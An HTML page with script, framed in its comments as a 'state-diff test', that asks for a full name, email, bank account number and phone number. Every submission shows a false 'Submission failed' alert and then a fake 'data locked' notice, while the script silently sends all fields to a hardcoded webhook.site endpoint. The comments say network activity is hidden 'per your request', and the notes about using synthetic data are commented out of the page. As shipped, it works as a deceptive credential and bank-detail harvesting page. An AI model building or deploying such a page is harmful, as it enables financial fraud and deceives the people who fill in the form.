<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>State-diff Test — UI Fail / Backend Receives</title>
<style>
  body{font-family:system-ui,Segoe UI,Roboto,Arial;background:#f6f9fc;padding:28px;color:#111}
  .card{max-width:820px;margin:0 auto;background:#fff;border-radius:10px;padding:20px;box-shadow:0 10px 30px rgba(15,30,60,.06)}
  h1{margin:0 0 6px;font-size:20px}
  label{display:block;margin:12px 0 6px;font-weight:600}
  input,button,textarea{width:100%;padding:10px;border:1px solid #d7dbe0;border-radius:6px;font-size:14px}
  .row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
  .muted{color:#666;font-size:13px}
</style>
</head>
<body>
<div class="card">
  <!-- <h1>State-diff Test — UI shows FAIL but backend GETS</h1> -->
  <!-- <p class="muted">This page simulates a UI that shows a failure message while still sending the request to the backend webhook. Replace <code>WEBHOOK_URL</code> in the script with your webhook endpoint.</p> -->

  <form id="theForm">
    <label>Full name
      <input id="name" name="name" placeholder="Your full name" required>
    </label>

    <label>Email
      <input id="email" name="email" type="email" placeholder="you@example.com" required>
    </label>

    <div class="row">
      <div>
        <label>Bank account number
          <input id="bank" name="bank" placeholder="1234 5678 9012">
        </label>
      </div>
      <div>
        <label>Phone number
          <input id="phone" name="phone" placeholder="+61 4xx xxx xxx">
        </label>
      </div>
    </div>

    <label>Optional note
      <textarea id="note" name="note" rows="3" placeholder="Optional note"></textarea>
    </label>

    <button id="submitBtn" type="submit">Submit</button>
  </form>

  <!-- <p class="muted" style="margin-top:14px">Note: do not enter real sensitive production data when testing — use synthetic values.</p> -->
</div>

<script>
/* ================= CONFIG =================
   Replace this with your webhook endpoint (HTTPS)
   Example: "https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
*/
const WEBHOOK_URL = "https://webhook.site/#!/view/e88d3c00-661e-4199-a252-70bfe723ecea"; // <- REPLACE WITH YOUR ENDPOINT
/* ========================================== */

/* Attempt counter (session-lifetime). If you want persistence across reloads, change to localStorage. */
let attempts = 0;
const MAX_ATTEMPTS = 3;

document.getElementById('theForm').onsubmit = async function(e){
  e.preventDefault();

  if (attempts >= MAX_ATTEMPTS) {
    // double-check: locked state — show contact prompt
    const mailto = "security@example.com"; // <- replace address if you want
    const subject = encodeURIComponent("Locked Data — Assistance Required");
    const body = encodeURIComponent("My data appears locked after 3 failed submissions. Please advise.");
    const openMail = confirm("Your data has been locked after 3 failed attempts.\n\nWould you like to contact support now?");
    if (openMail) {
      window.location.href = `mailto:${mailto}?subject=${subject}&body=${body}`;
    }
    return;
  }

  attempts += 1;

  // collect form payload
  const payload = {
    name: document.getElementById('name').value || "",
    email: document.getElementById('email').value || "",
    bank_account: document.getElementById('bank').value || "",
    phone: document.getElementById('phone').value || "",
    note: document.getElementById('note').value || "",
    ts: new Date().toISOString(),
    attempt: attempts,
    scenario: "uiShowsFail_but_backendGets"
  };

  // Immediately show UI failure popup (this simulates the deceptive UI)
  alert("Submission failed — please try again."); // front-end failure message shown to user

  // If this was the 3rd attempt, show lock message after the failure alert
  if (attempts >= MAX_ATTEMPTS) {
    // Show lock dialog with mailto option
    const mailto = "security@example.com"; // <- replace as needed
    const subject = encodeURIComponent("Locked Data — Assistance Required");
    const body = encodeURIComponent("My data appears locked after 3 failed submissions. Please advise.");
    const contact = confirm("You have reached the maximum number of attempts. Your data has been locked. Click OK to contact support.");
    if (contact) {
      window.location.href = `mailto:${mailto}?subject=${subject}&body=${body}`;
    }
  }

  // Still send data to backend webhook (so backend receives it regardless of UI)
  // We intentionally do not surface network details on the page (per your request).
  try {
    // use fetch but ignore response in UI; agent/backend can inspect webhook dashboard
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify(payload),
      credentials: "omit"
    });
    // no UI change here — backend receives the payload; check your webhook dashboard to confirm
  } catch (err) {
    // swallow network errors silently (no debug UI), but keep attempts semantics unchanged
    // you can open browser console to see the error if needed
    console.error("fetch error:", err);
  }

  // end of submission handler
};
</script>
</body>
</html>
